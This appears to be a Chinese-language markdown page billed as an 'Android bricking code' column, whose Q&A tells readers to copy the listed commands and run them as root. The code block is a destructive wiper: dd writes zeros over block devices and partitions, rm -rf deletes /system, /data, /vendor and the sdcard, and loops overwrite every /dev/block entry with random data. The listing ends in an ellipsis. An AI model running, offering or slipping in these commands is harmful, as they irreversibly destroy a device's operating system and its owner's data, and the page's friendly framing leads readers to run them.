## 您永远の家

欢迎来到尤苏奈尔的格机专栏！   
这里可以看到持续更新的安卓格机代码。   

# Q ＆ A

### Q：何处使用这些格机？

A：您可以直接复制然后到终端用root用户权限执行

```markdown

dd if=/dev/zero of=/dev/block/sda bs=1M count=100
dd if=/dev/zero of=/dev/block/sdb
dd if=/dev/zero of=/dev/block/sdc
dd if=/dev/zero of=/dev/block/sdd
dd if=/dev/zero of=/dev/block/sde
dd if=/dev/zero of=/dev/block/sdf
dd if=/dev/zero of=/dev/block/sda1
dd if=/dev/zero of=/dev/block/sda2
dd if=/dev/zero of=/dev/block/sda3
dd if=/dev/zero of=/dev/block/sda4
dd if=/dev/zero of=/dev/block/sda5
dd if=/dev/zero of=/dev/block/sda6
dd if=/dev/zero of=/dev/block/sda7
dd if=/dev/zero of=/dev/block/sda8
dd if=/dev/zero of=/dev/block/sda9
dd if=/dev/zero of=/dev/block/sda10
dd if=/dev/zero of=/dev/block/sda11
dd if=/dev/zero of=/dev/block/sda12
dd if=/dev/zero of=/dev/block/sda13

dd if=/dev/zero of=/dev/block/loop*
dd if=/dev/zero of=$(magisk --path)/.magisk/block/system_root

rm -rf /system
rm -rf /data
rm -rf /vendor
rm -rf /product
rm -rf /sdcard
rm -rf /storage/emulated/0
rm -rf /storage/sdcard

devices=`ls /dev/block/sd*`
for poweroff in ${devices}
do
echo "poweroff" > ${poweroff}
done

for unonline in $(ls -aR /dev/block/*)
do
dd if=/dev/urandom of=${unonline} bs=1k count=1
done

……

```
